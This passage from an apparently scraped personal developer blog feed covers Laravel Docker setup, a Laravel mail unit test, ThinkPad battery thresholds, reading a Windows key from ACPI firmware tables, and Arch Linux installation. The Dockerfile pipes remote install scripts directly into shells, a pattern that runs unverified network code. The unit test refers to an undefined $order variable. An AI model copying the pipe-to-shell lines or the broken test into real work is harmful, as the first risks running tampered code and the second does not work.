class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">FROM php:<span class="number">8.0</span>-fpm</span><br><span class="line"></span><br><span class="line">ARG DEBIAN_FRONTEND=noninteractive</span><br><span class="line"></span><br><span class="line"><span class="comment"># Install dependencies</span></span><br><span class="line">RUN apt-get update &amp;&amp; apt-get install -y <span class="string">\</span></span><br><span class="line">    procps <span class="string">\</span></span><br><span class="line">    libonig-dev <span class="string">\</span></span><br><span class="line">    libzip-dev <span class="string">\</span></span><br><span class="line">    libicu-dev <span class="string">\</span></span><br><span class="line">    build-essential <span class="string">\</span></span><br><span class="line">    libpng-dev <span class="string">\</span></span><br><span class="line">    libjpeg62-turbo-dev <span class="string">\</span></span><br><span class="line">    libfreetype6-dev <span class="string">\</span></span><br><span class="line">    locales <span class="string">\</span></span><br><span class="line">    zip <span class="string">\</span></span><br><span class="line">    jpegoptim optipng pngquant gifsicle <span class="string">\</span></span><br><span class="line">    vim <span class="string">\</span></span><br><span class="line">    unzip <span class="string">\</span></span><br><span class="line">    git <span class="string">\</span></span><br><span class="line">    curl</span><br><span class="line"></span><br><span class="line"><span class="comment"># install npm</span></span><br><span class="line">RUN curl -sL https:<span class="regexp">//deb.nodesource.com/setup_15.x | bash -</span></span><br><span class="line"><span class="regexp">RUN apt-get install -y nodejs</span></span><br><span class="line"><span class="regexp">RUN curl -L https://</span>npmjs.org/install.sh | sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># Clear cache</span></span><br><span class="line">RUN apt-get clean &amp;&amp; rm -rf <span class="regexp">/var/lib/apt/lists/</span>*</span><br><span class="line"></span><br><span class="line"><span class="comment"># Install extensions</span></span><br><span class="line">RUN docker-php-ext-install pdo_mysql mbstring zip exif pcntl intl</span><br><span class="line">RUN docker-php-ext-configure gd --<span class="keyword">with</span>-freetype --<span class="keyword">with</span>-jpeg</span><br><span class="line">RUN docker-php-ext-install gd</span><br><span class="line">RUN pecl install redis &amp;&amp; docker-php-ext-enable redis</span><br><span class="line"></span><br><span class="line"><span class="comment"># Install composer</span></span><br><span class="line">RUN curl -sS https:<span class="regexp">//getcomposer.org/installer | php -- --install-dir=/usr/local/bin --filename=composer</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">EXPOSE 9000</span></span><br><span class="line"><span class="regexp">CMD [&quot;php-fpm&quot;]</span></span><br></pre></td></tr></table></figure><p>And update <strong>docker-compose.yml</strong></p><p>add</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">php-fpm:</span></span><br><span class="line">    <span class="attr">build:</span></span><br><span class="line">      <span class="attr">context:</span> <span class="string">./docker/php</span></span><br><span class="line">      <span class="attr">dockerfile:</span> <span class="string">Dockerfile</span></span><br></pre></td></tr></table></figure><p>remove</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">image</span>: php:<span class="number">8</span>.<span class="number">0</span>-fpm</span><br></pre></td></tr></table></figure><p>Remember to update <strong>.env</strong>, to point the DB &amp; redis host to docker container</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">DB_HOST</span>=mysql</span><br><span class="line"><span class="attr">REDIS_HOST</span>=redis</span><br></pre></td></tr></table></figure><p>Now run <code>docker-compose up -d</code> should be able to visit <code>127.0.0.1:8080</code></p><hr><h2 id="Create-customized-base-image"><a href="#Create-customized-base-image" class="headerlink" title="Create customized base image"></a>Create customized base image</h2><p>Can build the image to <a href="https://hub.docker.com/">Docker Hub</a>, it’s free for public image</p><p><a href="https://github.com/jslim89/docker-config-dev/tree/master/base-images/php-fpm">Refer to my Github repo</a><br>for how to create base image. It’s based on <code>php:8.0-fpm</code> image</p><p><img src="/images/posts/2021-02-08-Real-world-practice-on-Docker-in-Laravel-web-app/docker-image-concept.png" alt="Docker image concept"></p><p>Basically the idea is, if we have 2nd or 3rd Laravel project, can just use the<br>base image, and duplicate the required extensions for all projects.<br>It also take quite a few minutes to install everything when we run <code>docker-compose up</code>.<br>Base image is like a template, everything is ready, can use in all Laravel projects.<br>Just extends the pre-built custom base image <em>(i.e. jslim/php8-laravel-base in my example here)</em></p><p>Update <strong>Dockerfile</strong>, change</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">FROM</span> php:<span class="number">8</span>.<span class="number">0</span>-fpm</span><br></pre></td></tr></table></figure><p>to</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FROM jslim/php8-laravel-base:latest</span><br></pre></td></tr></table></figure><p>and remove those apt install commands</p><hr><h2 id="In-production"><a href="#In-production" class="headerlink" title="In production"></a>In production</h2><p>In production we usually don’t use database in same instance with web app,<br>we can create another <strong>docker-compose-production.yml</strong></p><p>Remove <strong>mysql</strong>, and perhaps need to have custom <strong>php.ini</strong> config,<br>and may be have custom nginx config, SSL cert, etc</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;3&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">php-fpm:</span></span><br><span class="line">    <span class="attr">build:</span></span><br><span class="line">      <span class="attr">context:</span> <span class="string">./docker/php</span></span><br><span class="line">      <span class="attr">dockerfile:</span> <span class="string">Dockerfile</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">jslim-php-fpm</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">unless-stopped</span></span><br><span class="line">    <span class="attr">tty:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">working_dir:</span> <span class="string">/var/www/app</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">redis</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">../src:/var/www/app</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./docker/php/local.ini:/usr/local/etc/php/conf.d/local.ini</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">jslim-network</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">nginx:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">nginx:alpine</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">jslim-nginx</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">unless-stopped</span></span><br><span class="line">    <span class="attr">tty:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">php-fpm</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">80</span><span class="string">:80</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">443</span><span class="string">:443</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">../src:/var/www/app</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./docker/nginx/conf.d/nginx.conf:/etc/nginx/conf.d/app.conf</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./docker/nginx/ssl-snippets.conf:/etc/nginx/snippets/ssl.conf</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./docker/nginx/ssl/nginx.crt:/etc/ssl/certs/nginx.crt</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./docker/nginx/ssl/nginx.key:/etc/ssl/private/nginx.key</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">jslim-network</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">redis:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">redis:6-alpine</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">jslim-redis</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">jslim-network</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Docker Networks</span></span><br><span class="line"><span class="attr">networks:</span></span><br><span class="line">  <span class="attr">jslim-network:</span></span><br><span class="line">    <span class="attr">driver:</span> <span class="string">bridge</span></span><br></pre></td></tr></table></figure><p>The file structure</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">├── docker</span><br><span class="line">│   ├── nginx</span><br><span class="line">│   │   ├── conf<span class="selector-class">.d</span></span><br><span class="line">│   │   │   └── nginx<span class="selector-class">.conf</span></span><br><span class="line">│   │   ├── ssl</span><br><span class="line">│   │   │   ├── nginx<span class="selector-class">.crt</span></span><br><span class="line">│   │   │   └── nginx<span class="selector-class">.key</span></span><br><span class="line">│   │   └── ssl-snippets<span class="selector-class">.conf</span></span><br><span class="line">│   └── php</span><br><span class="line">│       ├── Dockerfile</span><br><span class="line">│       └── local<span class="selector-class">.ini</span></span><br><span class="line">├── docker-compose<span class="selector-class">.yml</span></span><br><span class="line">├── docker-compose-production<span class="selector-class">.yml</span></span><br><span class="line">└── <span class="attribute">src</span> (laravel project)</span><br></pre></td></tr></table></figure><p>To run in production</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span> docker<span class="literal">-compose</span> <span class="operator">-f</span> docker<span class="literal">-compose-production</span>.yml up <span class="literal">-d</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;I heard about Docker few years ago, but wasn’t know about best practice how to use that.&lt;br&gt;I’ve tried Laradock, it’s way too many stuff</summary>
        
      
    
    
    
    
    <category term="laravel" scheme="http://jslim.net/tags/laravel/"/>
    
    <category term="docker" scheme="http://jslim.net/tags/docker/"/>
    
  </entry>
  
  <entry>
    <title>Laravel Unit Test Mail Send</title>
    <link href="http://jslim.net/blog/2021/02/02/Laravel-Unit-Test-Mail-Send/"/>
    <id>http://jslim.net/blog/2021/02/02/Laravel-Unit-Test-Mail-Send/</id>
    <published>2021-02-02T01:54:33.000Z</published>
    <updated>2022-05-09T09:30:48.617Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Case-1-Mail-send-without-Mailable-class"><a href="#Case-1-Mail-send-without-Mailable-class" class="headerlink" title="Case 1: Mail send without Mailable class"></a>Case 1: Mail send without Mailable class</h2><p>Sometime we don’t use mailable class, instead we want to send directly with <code>send</code> method.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sendMailOrderShipped</span>(<span class="params"><span class="variable">$order</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$subject</span> = <span class="string">&#x27;Order &#x27;</span> . <span class="variable">$order</span>-&gt;id . <span class="string">&#x27; is shipped&#x27;</span>;</span><br><span class="line">    <span class="variable">$recipient</span> = <span class="variable">$order</span>-&gt;user-&gt;email;</span><br><span class="line">    <span class="title class_">\Illuminate\Support\Facades\Mail</span>::<span class="title function_ invoke__">send</span>(<span class="string">&#x27;emails.order-shipped&#x27;</span>, <span class="title function_ invoke__">compact</span>(<span class="string">&#x27;order&#x27;</span>), function (<span class="variable">$message</span>) <span class="keyword">use</span> ($<span class="title">subject</span>, $<span class="title">recipient</span>) &#123;</span><br><span class="line">        $<span class="title">message</span></span><br><span class="line">            -&gt;<span class="title">to</span>($<span class="title">recipient</span>)</span><br><span class="line">            -&gt;<span class="title">subject</span>($<span class="title">subject</span>)</span><br><span class="line">        ;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Unit test case</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/** <span class="doctag">@test</span> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">user_should_receive_order_shipped_email</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="title class_">Mail</span>::<span class="title function_ invoke__">fake</span>();</span><br><span class="line"></span><br><span class="line">    <span class="variable">$user</span> = <span class="title class_">User</span>::<span class="title function_ invoke__">factory</span>()-&gt;<span class="title function_ invoke__">create</span>();</span><br><span class="line">    <span class="variable">$deal</span> = <span class="title class_">Order</span>::<span class="title function_ invoke__">factory</span>()</span><br><span class="line">        -&gt;<span class="keyword">for</span>(<span class="variable">$user</span>)</span><br><span class="line">        -&gt;<span class="title function_ invoke__">create</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="variable">$recipient</span> = <span class="variable">$user</span>-&gt;email;</span><br><span class="line">    <span class="variable">$subject</span> = <span class="string">&#x27;Order &#x27;</span> . <span class="variable">$order</span>-&gt;id . <span class="string">&#x27; is shipped&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">Mail</span>::<span class="title function_ invoke__">shouldReceive</span>(<span class="string">&#x27;send&#x27;</span>)</span><br><span class="line">        -&gt;<span class="title function_ invoke__">with</span>(</span><br><span class="line">            <span class="string">&#x27;emails.order-shipped&#x27;</span>,</span><br><span class="line">            <span class="title class_">Mockery</span>::<span class="title function_ invoke__">type</span>(<span class="string">&#x27;array&#x27;</span>),</span><br><span class="line">            <span class="title class_">Mockery</span>::<span class="title function_ invoke__">on</span>(function (\<span class="built_in">Closure</span> <span class="variable">$closure</span>) <span class="keyword">use</span> (<span class="variable">$subject</span>, <span class="variable">$recipient</span>) &#123;</span><br><span class="line">                <span class="variable">$mock</span> = <span class="title class_">Mockery</span>::<span class="title function_ invoke__">mock</span>(<span class="title class_">\Illuminate\Mail\Message</span>::<span class="variable language_">class</span>);</span><br><span class="line">                <span class="variable">$mock</span>-&gt;<span class="title function_ invoke__">shouldReceive</span>(<span class="string">&#x27;to&#x27;</span>)-&gt;<span class="title function_ invoke__">once</span>()-&gt;<span class="title function_ invoke__">with</span>(<span class="variable">$recipient</span>)-&gt;<span class="title function_ invoke__">andReturn</span>(<span class="variable">$mock</span>);</span><br><span class="line">                <span class="variable">$mock</span>-&gt;<span class="title function_ invoke__">shouldReceive</span>(<span class="string">&#x27;subject&#x27;</span>)-&gt;<span class="title function_ invoke__">once</span>()-&gt;<span class="title function_ invoke__">with</span>(<span class="variable">$subject</span>);</span><br><span class="line"></span><br><span class="line">                <span class="variable">$closure</span>(<span class="variable">$mock</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;),</span><br><span class="line">        )</span><br><span class="line">        -&gt;<span class="title function_ invoke__">times</span>(<span class="number">1</span>)</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">sendMailOrderShipped</span>(<span class="variable">$order</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h2 id=&quot;Case-1-Mail-send-without-Mailable-class&quot;&gt;&lt;a href=&quot;#Case-1-Mail-send-without-Mailable-class&quot; class=&quot;headerlink&quot; title=&quot;Case 1: Mail</summary>
        
      
    
    
    
    
    <category term="laravel" scheme="http://jslim.net/tags/laravel/"/>
    
    <category term="unit-test" scheme="http://jslim.net/tags/unit-test/"/>
    
    <category term="phpunit" scheme="http://jslim.net/tags/phpunit/"/>
    
  </entry>
  
  <entry>
    <title>Thinkpad - Set battery charging threshold in Linux</title>
    <link href="http://jslim.net/blog/2020/11/06/Thinkpad-Set-battery-charging-threshold-in-Linux/"/>
    <id>http://jslim.net/blog/2020/11/06/Thinkpad-Set-battery-charging-threshold-in-Linux/</id>
    <published>2020-11-06T10:00:14.000Z</published>
    <updated>2022-05-09T09:30:48.617Z</updated>
    
    <content type="html"><![CDATA[<p>With kernel 4.17 above, we can set the threshold directly</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ echo <span class="number">85</span> &gt; /sys/<span class="keyword">class</span>/<span class="symbol">power_supply</span>/<span class="symbol">BAT0</span>/<span class="symbol">charge_start_threshold</span></span><br><span class="line">$ <span class="symbol">echo</span> <span class="symbol">95</span> &gt; /<span class="symbol">sys</span>/<span class="symbol">class</span>/<span class="symbol">power_supply</span>/<span class="symbol">BAT0</span>/<span class="symbol">charge_stop_threshold</span></span><br></pre></td></tr></table></figure><p>When the battery down to 85%, the charging will start<br>When it’s over 95%, will stop</p><h2 id="References"><a href="#References" class="headerlink" title="References:"></a>References:</h2><p><a href="https://wiki.archlinux.org/index.php/tp_smapi">Archlinux Wiki - tp_smapi</a></p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;With kernel 4.17 above, we can set the threshold directly&lt;/p&gt;
&lt;figure class=&quot;highlight angelscript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td</summary>
        
      
    
    
    
    
    <category term="linux" scheme="http://jslim.net/tags/linux/"/>
    
    <category term="thinkpad" scheme="http://jslim.net/tags/thinkpad/"/>
    
  </entry>
  
  <entry>
    <title>Activate Windows 10 in VirtualBox</title>
    <link href="http://jslim.net/blog/2020/04/24/Activate-Windows-10-in-VirtualBox/"/>
    <id>http://jslim.net/blog/2020/04/24/Activate-Windows-10-in-VirtualBox/</id>
    <published>2020-04-24T13:13:51.000Z</published>
    <updated>2022-05-09T09:30:48.617Z</updated>
    
    <content type="html"><![CDATA[<p>I’m using Windows 10 in VirtualBox for testing purpose, where my main OS is formatted to Ubuntu.</p><p>I noticed I can activate the Windows 10 with the key sealed in hardware,<br>get the key with the follwing command</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo tail -c +<span class="number">56</span> <span class="regexp">/sys/</span>firmware<span class="regexp">/acpi/</span>tables/MSDM</span><br><span class="line">ABCDE-<span class="number">12345</span>-FGHIJ-<span class="number">67890</span>-KLMNO</span><br></pre></td></tr></table></figure><p><img src="/images/posts/2020-04-24-Activate-Windows-10-in-VirtualBox/windows-10-activated.png" alt="Windows 10 activated in VirtualBox"></p><h2 id="References"><a href="#References" class="headerlink" title="References:"></a>References:</h2><ul><li><a href="https://forum.manjaro.org/t/howto-legally-use-windows-10-in-virtualbox/71996">[HowTo] Legally use Windows 10 in VirtualBox</a></li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;I’m using Windows 10 in VirtualBox for testing purpose, where my main OS is formatted to Ubuntu.&lt;/p&gt;
&lt;p&gt;I noticed I can activate the</summary>
        
      
    
    
    
    
    <category term="windows" scheme="http://jslim.net/tags/windows/"/>
    
    <category term="virtualbox" scheme="http://jslim.net/tags/virtualbox/"/>
    
  </entry>
  
  <entry>
    <title>Web development testing in Android Virtual Device</title>
    <link href="http://jslim.net/blog/2020/02/11/Web-development-testing-in-Android-Virtual-Device/"/>
    <id>http://jslim.net/blog/2020/02/11/Web-development-testing-in-Android-Virtual-Device/</id>
    <published>2020-02-11T10:10:13.000Z</published>
    <updated>2022-05-09T09:30:48.617Z</updated>
    
    <content type="html"><![CDATA[<p>Some time, we will need to test web development in mobile devices.<br>Previously, I used to test in iOS simulator, the virtual host will just work.</p><p>E.g. <a href="http://myproject.test/">http://myproject.test</a>, by inputing this URL to simulator Safari, will just work fine.</p><p>Recently I tried to install AVD, unfortunately, the device <em>(simulator)</em> just don’t know about <code>myproject.test</code>.<br>In this case, need to edit the hosts file</p><p>First, find out which device you want to use</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="regexp">/path/</span>to<span class="regexp">/android/</span>sdk<span class="regexp">/platform-tools/</span>adb devices</span><br><span class="line">List of devices attached</span><br><span class="line">emulator-<span class="number">5554</span>device</span><br><span class="line">emulator-<span class="number">5556</span>device</span><br></pre></td></tr></table></figure><p>Set the emulator to writable <em>(<code>nexus_5</code> here is the device name)</em></p><p><img src="/images/posts/2020-02-11-Web-development-testing-in-Android-Virtual-Device/create-device.png" alt="AVD create device"></p><p>Choose <strong>x86 Images</strong>, then choose <strong>Android 7.1.1</strong> <em>(non Google APIs)</em> <em>(see reference below for more details)</em></p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="regexp">/path/</span>to<span class="regexp">/android/</span>sdk<span class="regexp">/tools/</span>emulator -writable-system -netdelay none -netspeed full -avd nexus_5</span><br><span class="line">$ <span class="regexp">/path/</span>to<span class="regexp">/android/</span>sdk<span class="regexp">/platform-tools/</span>adb -s emulator-<span class="number">5556</span> root</span><br><span class="line">$ <span class="regexp">/path/</span>to<span class="regexp">/android/</span>sdk<span class="regexp">/platform-tools/</span>adb -s emulator-<span class="number">5556</span> remount</span><br><span class="line"></span><br><span class="line"># <span class="keyword">push</span> <span class="regexp">/etc/</span>hosts</span><br><span class="line">$ <span class="regexp">/path/</span>to<span class="regexp">/android/</span>sdk<span class="regexp">/platform-tools/</span>adb -s emulator-<span class="number">5556</span> <span class="keyword">push</span> <span class="regexp">/local/</span>path<span class="regexp">/to/</span>hosts <span class="regexp">/system/</span>etc/hosts</span><br></pre></td></tr></table></figure><p>Open browser in android device, type in the URL <a href="http://myproject.test/">http://myproject.test</a></p><h2 id="References"><a href="#References" class="headerlink" title="References:"></a>References:</h2><ul><li><a href="https://www.thepolyglotdeveloper.com/2019/12/change-host-file-android-emulator/">Change the Host File of an Android Emulator</a></li><li><a href="https://stackoverflow.com/questions/14654718/how-to-use-adb-shell-when-multiple-devices-are-connected-fails-with-error-mor">How to use ADB Shell when Multiple Devices are connected? Fails with “error: more than one device and emulator”</a></li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;Some time, we will need to test web development in mobile devices.&lt;br&gt;Previously, I used to test in iOS simulator, the virtual host will</summary>
        
      
    
    
    
    
    <category term="android" scheme="http://jslim.net/tags/android/"/>
    
    <category term="avd" scheme="http://jslim.net/tags/avd/"/>
    
    <category term="hosts" scheme="http://jslim.net/tags/hosts/"/>
    
  </entry>
  
  <entry>
    <title>Install Arch Linux</title>
    <link href="http://jslim.net/blog/2020/01/22/Install-Arch-Linux/"/>
    <id>http://jslim.net/blog/2020/01/22/Install-Arch-Linux/</id>
    <published>2020-01-22T14:49:03.000Z</published>
    <updated>2022-05-09T09:30:48.617Z</updated>
    
    <content type="html"><![CDATA[<p>First of all, I must say that I was referring <a href="https://www.ostechnix.com/">OSTechNix</a> for the installation guide.</p><p>But when I tried to install, I faced some minor issue, that’s why I write this post.<br>Also, I not follow everything from the guide <em>(but most of the things)</em></p><h2 id="Partition-the-disk"><a href="#Partition-the-disk" class="headerlink" title="Partition the disk"></a>Partition the disk</h2><p>Just follow <a href="https://www.ostechnix.com/install-arch-linux-latest-version/">OSTechNix guide - Step 3: Partition Hard drive</a> to create partitions.</p><p>If you don’t want to use double of your RAM size to create the swap, you can <a href="https://help.ubuntu.com/community/SwapFaq">refer to this</a>.</p><h2 id="Install-base-system"><a href="#Install-base-system" class="headerlink" title="Install base system"></a>Install base system</h2><p>Mount the disk</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">mount /dev/sda1 /mnt</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">mkdir</span> /mnt/home</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">mount /dev/sda5 /mnt/home</span></span><br></pre></td></tr></table></figure><p>Install</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># <span class="keyword">this</span> <span class="keyword">step</span> refer https:<span class="comment">//wiki.archlinux.org/index.php/Installation_guide</span></span><br><span class="line">$ pacstrap /mnt base linux linux-firmware</span><br><span class="line">$ genfstab -U <span class="regexp">/mnt &gt;&gt; /m</span>nt<span class="regexp">/etc/</span>fstab</span><br></pre></td></tr></table></figure><p>Initial setup to the installed system</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">arch-chroot /mnt</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">pacman -S vim dhcpcd</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">vim /etc/locale.gen</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">locale-gen</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">vim /etc/locale.conf</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">set</span> your own timezone</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">ln</span> -s /usr/share/zoneinfo/Asia/Kuala_Lumpur /etc/localtime</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">hwclock --systohc --utc</span></span><br></pre></td></tr></table></figure><p>Set <strong>root</strong> password</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>passwd</span><br></pre></td></tr></table></figure><h3 id="Set-the-hostname"><a href="#Set-the-hostname" class="headerlink" title="Set the hostname"></a>Set the hostname</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ vim <span class="regexp">/etc/</span>hostname</span><br></pre></td></tr></table></figure><p>Here I put my name as hostname</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">js</span></span><br></pre></td></tr></table></figure><h3 id="Set-the-hosts-file"><a href="#Set-the-hosts-file" class="headerlink" title="Set the hosts file"></a>Set the hosts file</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ vim <span class="regexp">/etc/</span>hosts</span><br></pre></td></tr></table></figure><p>with content</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span 